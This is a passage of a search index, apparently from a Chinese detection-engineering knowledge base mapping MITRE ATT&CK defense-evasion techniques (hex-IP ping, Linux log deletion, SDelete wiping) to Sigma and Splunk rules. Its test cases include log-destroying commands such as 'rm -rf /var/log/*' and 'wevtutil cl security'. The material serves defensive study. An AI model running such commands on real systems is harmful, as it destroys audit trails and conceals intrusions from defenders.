2012\u4ee5\u4e0a\u64cd\u4f5c\u7cfb\u7edf","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_4","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#sigma","text":"title: Ping Hex IP description: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c references: - https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_ping_hex_ip.yml status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: security detection: selection: CommandLine: - '*\\ping.exe 0x*' - '*\\ping 0x*' condition: selection level: high","title":"sigma\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-003-win-Ping%20Hex%20IP/#_7","text":"MITRE-ATT&CK-T1027-003 https://attack.mitre.org/techniques/T1027/003/ IP\u5730\u5740\u8fdb\u5236\u8f6c\u6362 https://tool.520101.com/wangluo/jinzhizhuanhuan/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/","text":"T1027-005-linux-\u4e3b\u673a\u4e0a\u7684\u76d1\u6d4b\u7ec4\u4ef6\u5220\u9664 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5220\u9664\u6216\u66f4\u6539\u4e3b\u673a\u7cfb\u7edf\u4e0a\u751f\u6210\u7684\u8bb0\u5f55\uff0c\u5305\u62ec\u65e5\u5fd7\u548c\u53ef\u80fd\u6355\u83b7\u7684\u6587\u4ef6\uff0c\u4f8b\u5982\u9694\u79bb\u7684\u6076\u610f\u8f6f\u4ef6\u3002\u65e5\u5fd7\u7684\u4f4d\u7f6e\u548c\u683c\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u4f46\u653b\u51fb\u8005\u7684\u64cd\u4f5c\u884c\u4e3a\u90fd\u4f1a\u88ab\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u8bb0\u5f55\uff0c\u6bd4\u5982\u5178\u578b\u7684windows\u65e5\u5fd7\u3001linux\u548cMac\u7684bash\u5386\u53f2\u8bb0\u5f55\u6216\u8005/var/log\u4e0b\u7684\u65e5\u5fd7\u6587\u4ef6\u3002 \u653b\u51fb\u8005\u5e72\u6270\u4e8b\u4ef6\u7684\u8bb0\u5f55\uff0c\u53ef\u4ee5\u7834\u574f\u5b89\u5168\u8bbe\u5907\u7684\u68c0\u6d4b\u4e0e\u544a\u8b66\uff0c\u4ece\u800c\u5bfc\u81f4\u6076\u610f\u653b\u51fb\u4e8b\u4ef6\u672a\u88ab\u901a\u62a5\u3002\u7531\u4e8e\u7f3a\u4e4f\u8db3\u591f\u7684\u6570\u636e\u6765\u786e\u5b9a\u53d1\u751f\u7684\u5f02\u5e38\u60c5\u51b5\uff0c\u8fd8\u53ef\u80fd\u4f7f\u5b89\u5168\u4eba\u5458\u7684\u5206\u6790\u548c\u4e8b\u4ef6\u54cd\u5e94\u66f4\u52a0\u56f0\u96be\u3002 \u6d4b\u8bd5\u6848\u4f8b rm -rf /var/log/* \u68c0\u6d4b\u65e5\u5fd7 linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55 \u6d4b\u8bd5\u590d\u73b0 icbc@icbc:/$ sudo rm -r /var/log/icbc.log \u6d4b\u8bd5\u7559\u75d5 \u57fa\u4e8eaudit\u65e5\u5fd7 \u6682\u65e0 \u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55 icbc@icbc:/$ history 20 sudo rm -r /var/log/icbc.log \uff08\u6ce8\u610f\u8fd9\u91cc\u5220\u9664\u7684\u662f\u6d4b\u8bd5log\u6587\u4ef6\uff09 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u68c0\u6d4b\u89c4\u5219 \u57fa\u4e8eaudit\u65e5\u5fd7 index=linux sourcetype=linux_audit syscall=263 | table host,auid,uid,euid,exe,key index=linux sourcetype=linux_audit type=PATH name=*.log nametype=delete \u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55 index=linux sourcetype=\"bash_history\" rm * .log | table host, user_name, bash_command \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1027-005 https://attack.mitre.org/techniques/T1027/005/","title":"T1027-005-linux-\u4e3b\u673a\u4e0a\u7684\u76d1\u6d4b\u7ec4\u4ef6\u5220\u9664"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#t1027-005-linux-","text":"","title":"T1027-005-linux-\u4e3b\u673a\u4e0a\u7684\u76d1\u6d4b\u7ec4\u4ef6\u5220\u9664"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5220\u9664\u6216\u66f4\u6539\u4e3b\u673a\u7cfb\u7edf\u4e0a\u751f\u6210\u7684\u8bb0\u5f55\uff0c\u5305\u62ec\u65e5\u5fd7\u548c\u53ef\u80fd\u6355\u83b7\u7684\u6587\u4ef6\uff0c\u4f8b\u5982\u9694\u79bb\u7684\u6076\u610f\u8f6f\u4ef6\u3002\u65e5\u5fd7\u7684\u4f4d\u7f6e\u548c\u683c\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u4f46\u653b\u51fb\u8005\u7684\u64cd\u4f5c\u884c\u4e3a\u90fd\u4f1a\u88ab\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u8bb0\u5f55\uff0c\u6bd4\u5982\u5178\u578b\u7684windows\u65e5\u5fd7\u3001linux\u548cMac\u7684bash\u5386\u53f2\u8bb0\u5f55\u6216\u8005/var/log\u4e0b\u7684\u65e5\u5fd7\u6587\u4ef6\u3002 \u653b\u51fb\u8005\u5e72\u6270\u4e8b\u4ef6\u7684\u8bb0\u5f55\uff0c\u53ef\u4ee5\u7834\u574f\u5b89\u5168\u8bbe\u5907\u7684\u68c0\u6d4b\u4e0e\u544a\u8b66\uff0c\u4ece\u800c\u5bfc\u81f4\u6076\u610f\u653b\u51fb\u4e8b\u4ef6\u672a\u88ab\u901a\u62a5\u3002\u7531\u4e8e\u7f3a\u4e4f\u8db3\u591f\u7684\u6570\u636e\u6765\u786e\u5b9a\u53d1\u751f\u7684\u5f02\u5e38\u60c5\u51b5\uff0c\u8fd8\u53ef\u80fd\u4f7f\u5b89\u5168\u4eba\u5458\u7684\u5206\u6790\u548c\u4e8b\u4ef6\u54cd\u5e94\u66f4\u52a0\u56f0\u96be\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_1","text":"rm -rf /var/log/*","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_2","text":"linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_3","text":"icbc@icbc:/$ sudo rm -r /var/log/icbc.log","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_4","text":"\u57fa\u4e8eaudit\u65e5\u5fd7 \u6682\u65e0 \u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55 icbc@icbc:/$ history 20 sudo rm -r /var/log/icbc.log \uff08\u6ce8\u610f\u8fd9\u91cc\u5220\u9664\u7684\u662f\u6d4b\u8bd5log\u6587\u4ef6\uff09","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#splunk","text":"","title":"splunk\u68c0\u6d4b\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#audit","text":"index=linux sourcetype=linux_audit syscall=263 | table host,auid,uid,euid,exe,key index=linux sourcetype=linux_audit type=PATH name=*.log nametype=delete","title":"\u57fa\u4e8eaudit\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#bash","text":"index=linux sourcetype=\"bash_history\" rm * .log | table host, user_name, bash_command","title":"\u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-linux-%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%9B%91%E6%B5%8B%E7%BB%84%E4%BB%B6%E5%88%A0%E9%99%A4/#_7","text":"MITRE-ATT&CK-T1027-005 https://attack.mitre.org/techniques/T1027/005/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/","text":"T1027-005-windows-SDelete\u5220\u9664\u6587\u4ef6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5220\u9664\u6216\u66f4\u6539\u4e3b\u673a\u7cfb\u7edf\u4e0a\u7684\u751f\u6210\u7269\uff0c\u5305\u62ec\u65e5\u5fd7\u548c\u6355\u83b7\u7684\u6587\u4ef6\uff0c\u4f8b\u5982\u9694\u79bb\u7684\u6076\u610f\u8f6f\u4ef6\u3002\u5c3d\u7ba1\u65e5\u5fd7\u7684\u4f4d\u7f6e\u548c\u683c\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u4f46\u5178\u578b\u7684\u6709\u673a\u7cfb\u7edf\u65e5\u5fd7\u4f1a\u88ab\u6355\u83b7\u4e3aWindows\u4e8b\u4ef6\u6216Linux/MacOS\u6587\u4ef6\uff0c\u5982Bash History\u548c/var/log/*\u3002 \u4e8b\u4ef6\u5e72\u6270\u64cd\u4f5c\u548c\u5176\u4ed6\u53ef\u7528\u4e8e\u68c0\u6d4b\u5165\u4fb5\u6d3b\u52a8\u7684\u901a\u77e5\u53ef\u80fd\u4f1a\u635f\u5bb3\u5b89\u5168\u89e3\u51b3\u65b9\u6848\u7684\u5b8c\u6574\u6027\uff0c\u5bfc\u81f4\u4e8b\u4ef6\u65e0\u6cd5\u62a5\u544a\u3002\u5b83\u4eec\u4e5f\u53ef\u80fd\u4f1a\u5bfc\u81f4\u53d6\u8bc1\u5206\u6790\u548c\u4e8b\u4ef6\u54cd\u5e94\u53d8\u5f97\u66f4\u52a0\u56f0\u96be\uff0c\u56e0\u4e3a\u5b83\u4eec\u7f3a\u4e4f\u8db3\u591f\u7684\u6570\u636e\u6765\u786e\u5b9a\u53d1\u751f\u4e86\u4ec0\u4e48\u3002 \u6e05\u9664Windows\u4e8b\u4ef6\u65e5\u5fd7 Windows\u4e8b\u4ef6\u65e5\u5fd7\u662f\u8ba1\u7b97\u673a\u8b66\u62a5\u548c\u901a\u77e5\u8bb0\u5f55\u3002\u5fae\u8f6f\u5c06\u4e8b\u4ef6\u5b9a\u4e49\u4e3a\u201c\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u9700\u8981\u901a\u77e5\u7528\u6237\u6216\u5c06\u6761\u76ee\u6dfb\u52a0\u5230\u65e5\u5fd7\u4e2d\u7684\u4efb\u4f55\u91cd\u8981\u4e8b\u4ef6\u201d\u3002\u6709\u4e09\u4e2a\u7cfb\u7edf\u5b9a\u4e49\u7684\u4e8b\u4ef6\u6e90\uff1a\u7cfb\u7edf\u3001\u5e94\u7528\u548c\u5b89\u5168\u3002 \u6267\u884c\u8d26\u53f7\u7ba1\u7406\u3001\u8d26\u53f7\u767b\u5f55\u548c\u76ee\u5f55\u670d\u52a1\u8bbf\u95ee\u7b49\u76f8\u5173\u64cd\u4f5c\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u9009\u62e9\u6e05\u9664\u4e8b\u4ef6\u6765\u9690\u85cf\u5176\u6d3b\u52a8\u3002 \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5b9e\u7528\u7a0b\u5e8f\u547d\u4ee4\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\uff1a \u00b7 wevtutil cl system \u00b7 wevtutil cl application \u00b7 wevtutil cl security \u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u673a\u5236\uff08\u5982PowerShell\uff09\u6e05\u9664\u65e5\u5fd7\u3002 \u6d4b\u8bd5\u6848\u4f8b SDelete\u662f\u4e00\u4e2a\u5e26\u6709\u8bb8\u591a\u9009\u9879\u7684\u547d\u4ee4\u884c\u5b9e\u7528\u5de5\u5177\u3002\u6309\u7167\u4efb\u4f55\u7ed9\u5b9a\u7528\u6cd5\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u5b83\u5220\u9664\u4e00\u4e2a\u6216\u591a\u4e2a\u6587\u4ef6\u548c/\u6216\u76ee\u5f55\uff0c\u6216\u8005\u6e05\u7406\u903b\u8f91\u78c1\u76d8\u4e0a\u7684\u53ef\u7528\u7a7a\u95f4\u3002SDelete\u5c06\u901a\u914d\u7b26\u63a5\u53d7\u4e3a\u76ee\u5f55\u6216\u6587\u4ef6\u8bf4\u660e\u7b26\u7684\u4e00\u90e8\u5206\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows security \u6d4b\u8bd5\u590d\u73b0 \u4e0b\u8f7dSDelete\u6587\u4ef6 \u4e0b\u8f7d\u5730\u5740: https://docs.microsoft.com/zh-cn/sysinternals/downloads/sdelete \u6267\u884c\u5220\u9664\u64cd\u4f5c C:\\Users\\12306Br0\\Desktop\\SDelete>sdelete64.exe -s SDelete.zip SDelete v2.02 - Secure file delete Copyright (C) 1999-2018 Mark Russinovich Sysinternals - www.sysinternals.com SDelete is set for 1 pass. No files/folders found that match SDelete.zip. \u6d4b\u8bd5\u7559\u75d5 Event-ID: 4663 \u8bd5\u56fe\u8bbf\u95ee\u5bf9\u8c61\u3002 \u5bf9\u8c61: \u5b89\u5168 ID: SYSTEM \u5e10\u6237\u540d: 12306BR0-PC$ \u5e10\u6237\u57df: WORKGROUP \u767b\u5f55 ID: 0x3e7 \u5bf9\u8c61: \u5bf9\u8c61\u670d\u52a1\u5668: Security \u5bf9\u8c61\u7c7b\u578b: File \u5bf9\u8c61\u540d: C:\\Windows\\System32\\mapi32.dll \u53e5\u67c4 ID: 0x4e8 \u8fdb\u7a0b\u4fe1\u606f: \u8fdb\u7a0b ID: 0x128 \u8fdb\u7a0b\u540d: C:\\Windows\\servicing\\TrustedInstaller.exe \u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f: \u8bbf\u95ee: DELETE \u8bbf\u95ee\u63a9\u7801: 0x10000 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u4f7f\u7528SDelete\u5b89\u5168\u5220\u9664 status: experimental description: \u4f7f\u7528SDelete\u5de5\u5177\u5220\u9664\u6587\u4ef6\u65f6\u68c0\u6d4b\u6587\u4ef6\u91cd\u547d\u540d author: 12306Br0(\u6d4b\u8bd5+\u7ffb\u8bd1) date: 2020/06/09 references: - https://jpcertcc.github.io/ToolAnalysisResultSheet - https://www.jpcert.or.jp/english/pub/sr/ir_research.html - https://technet.microsoft.com/en-us/en-en/sysinternals/sdelete.aspx tags: - attack.defense_evasion - attack.t1027 logsource: product: windows service: security detection: selection: EventID: - 4656 - 4663 - 4658 ObjectName: - '*.AAA' - '*.ZZZ' condition: selection falsepositives: - \u5408\u6cd5\u4f7f\u7528SDelete\uff0c\u6d4b\u8bd5\u7ed3\u679c\u4e0d\u5982\u4eba\u610f\uff0c\u5efa\u8bae\u8c28\u614e\u4f7f\u7528 level: low \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1027-005 https://attack.mitre.org/techniques/T1027/005/ MITRE-ATT&CK-T1066 https://attack.mitre.org/techniques/T1066/","title":"T1027-005-windows-SDelete\u5220\u9664\u6587\u4ef6"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#t1027-005-windows-sdelete","text":"","title":"T1027-005-windows-SDelete\u5220\u9664\u6587\u4ef6"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5220\u9664\u6216\u66f4\u6539\u4e3b\u673a\u7cfb\u7edf\u4e0a\u7684\u751f\u6210\u7269\uff0c\u5305\u62ec\u65e5\u5fd7\u548c\u6355\u83b7\u7684\u6587\u4ef6\uff0c\u4f8b\u5982\u9694\u79bb\u7684\u6076\u610f\u8f6f\u4ef6\u3002\u5c3d\u7ba1\u65e5\u5fd7\u7684\u4f4d\u7f6e\u548c\u683c\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u4f46\u5178\u578b\u7684\u6709\u673a\u7cfb\u7edf\u65e5\u5fd7\u4f1a\u88ab\u6355\u83b7\u4e3aWindows\u4e8b\u4ef6\u6216Linux/MacOS\u6587\u4ef6\uff0c\u5982Bash History\u548c/var/log/*\u3002 \u4e8b\u4ef6\u5e72\u6270\u64cd\u4f5c\u548c\u5176\u4ed6\u53ef\u7528\u4e8e\u68c0\u6d4b\u5165\u4fb5\u6d3b\u52a8\u7684\u901a\u77e5\u53ef\u80fd\u4f1a\u635f\u5bb3\u5b89\u5168\u89e3\u51b3\u65b9\u6848\u7684\u5b8c\u6574\u6027\uff0c\u5bfc\u81f4\u4e8b\u4ef6\u65e0\u6cd5\u62a5\u544a\u3002\u5b83\u4eec\u4e5f\u53ef\u80fd\u4f1a\u5bfc\u81f4\u53d6\u8bc1\u5206\u6790\u548c\u4e8b\u4ef6\u54cd\u5e94\u53d8\u5f97\u66f4\u52a0\u56f0\u96be\uff0c\u56e0\u4e3a\u5b83\u4eec\u7f3a\u4e4f\u8db3\u591f\u7684\u6570\u636e\u6765\u786e\u5b9a\u53d1\u751f\u4e86\u4ec0\u4e48\u3002 \u6e05\u9664Windows\u4e8b\u4ef6\u65e5\u5fd7 Windows\u4e8b\u4ef6\u65e5\u5fd7\u662f\u8ba1\u7b97\u673a\u8b66\u62a5\u548c\u901a\u77e5\u8bb0\u5f55\u3002\u5fae\u8f6f\u5c06\u4e8b\u4ef6\u5b9a\u4e49\u4e3a\u201c\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u9700\u8981\u901a\u77e5\u7528\u6237\u6216\u5c06\u6761\u76ee\u6dfb\u52a0\u5230\u65e5\u5fd7\u4e2d\u7684\u4efb\u4f55\u91cd\u8981\u4e8b\u4ef6\u201d\u3002\u6709\u4e09\u4e2a\u7cfb\u7edf\u5b9a\u4e49\u7684\u4e8b\u4ef6\u6e90\uff1a\u7cfb\u7edf\u3001\u5e94\u7528\u548c\u5b89\u5168\u3002 \u6267\u884c\u8d26\u53f7\u7ba1\u7406\u3001\u8d26\u53f7\u767b\u5f55\u548c\u76ee\u5f55\u670d\u52a1\u8bbf\u95ee\u7b49\u76f8\u5173\u64cd\u4f5c\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u9009\u62e9\u6e05\u9664\u4e8b\u4ef6\u6765\u9690\u85cf\u5176\u6d3b\u52a8\u3002 \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5b9e\u7528\u7a0b\u5e8f\u547d\u4ee4\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\uff1a \u00b7 wevtutil cl system \u00b7 wevtutil cl application \u00b7 wevtutil cl security \u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u673a\u5236\uff08\u5982PowerShell\uff09\u6e05\u9664\u65e5\u5fd7\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_1","text":"SDelete\u662f\u4e00\u4e2a\u5e26\u6709\u8bb8\u591a\u9009\u9879\u7684\u547d\u4ee4\u884c\u5b9e\u7528\u5de5\u5177\u3002\u6309\u7167\u4efb\u4f55\u7ed9\u5b9a\u7528\u6cd5\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u5b83\u5220\u9664\u4e00\u4e2a\u6216\u591a\u4e2a\u6587\u4ef6\u548c/\u6216\u76ee\u5f55\uff0c\u6216\u8005\u6e05\u7406\u903b\u8f91\u78c1\u76d8\u4e0a\u7684\u53ef\u7528\u7a7a\u95f4\u3002SDelete\u5c06\u901a\u914d\u7b26\u63a5\u53d7\u4e3a\u76ee\u5f55\u6216\u6587\u4ef6\u8bf4\u660e\u7b26\u7684\u4e00\u90e8\u5206\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_2","text":"windows security","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#sdelete","text":"\u4e0b\u8f7d\u5730\u5740: https://docs.microsoft.com/zh-cn/sysinternals/downloads/sdelete","title":"\u4e0b\u8f7dSDelete\u6587\u4ef6"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_4","text":"C:\\Users\\12306Br0\\Desktop\\SDelete>sdelete64.exe -s SDelete.zip SDelete v2.02 - Secure file delete Copyright (C) 1999-2018 Mark Russinovich Sysinternals - www.sysinternals.com SDelete is set for 1 pass. No files/folders found that match SDelete.zip.","title":"\u6267\u884c\u5220\u9664\u64cd\u4f5c"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_5","text":"Event-ID: 4663 \u8bd5\u56fe\u8bbf\u95ee\u5bf9\u8c61\u3002 \u5bf9\u8c61: \u5b89\u5168 ID: SYSTEM \u5e10\u6237\u540d: 12306BR0-PC$ \u5e10\u6237\u57df: WORKGROUP \u767b\u5f55 ID: 0x3e7 \u5bf9\u8c61: \u5bf9\u8c61\u670d\u52a1\u5668: Security \u5bf9\u8c61\u7c7b\u578b: File \u5bf9\u8c61\u540d: C:\\Windows\\System32\\mapi32.dll \u53e5\u67c4 ID: 0x4e8 \u8fdb\u7a0b\u4fe1\u606f: \u8fdb\u7a0b ID: 0x128 \u8fdb\u7a0b\u540d: C:\\Windows\\servicing\\TrustedInstaller.exe \u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f: \u8bbf\u95ee: DELETE \u8bbf\u95ee\u63a9\u7801: 0x10000","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_6","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#sigma","text":"title: \u4f7f\u7528SDelete\u5b89\u5168\u5220\u9664 status: experimental description: \u4f7f\u7528SDelete\u5de5\u5177\u5220\u9664\u6587\u4ef6\u65f6\u68c0\u6d4b\u6587\u4ef6\u91cd\u547d\u540d author: 12306Br0(\u6d4b\u8bd5+\u7ffb\u8bd1) date: 2020/06/09 references: - https://jpcertcc.github.io/ToolAnalysisResultSheet - https://www.jpcert.or.jp/english/pub/sr/ir_research.html - https://technet.microsoft.com/en-us/en-en/sysinternals/sdelete.aspx tags: - attack.defense_evasion - attack.t1027 logsource: product: windows service: security detection: selection: EventID: - 4656 - 4663 - 4658 ObjectName: - '*.AAA' - '*.ZZZ' condition: selection falsepositives: - \u5408\u6cd5\u4f7f\u7528SDelete\uff0c\u6d4b\u8bd5\u7ed3\u679c\u4e0d\u5982\u4eba\u610f\uff0c\u5efa\u8bae\u8c28\u614e\u4f7f\u7528 level: low","title":"sigma\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_7","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_8","text":"MITRE-ATT&CK-T1027-005 https://attack.mitre.org/techniques/T1027/005/ MITRE-ATT&CK-T1066 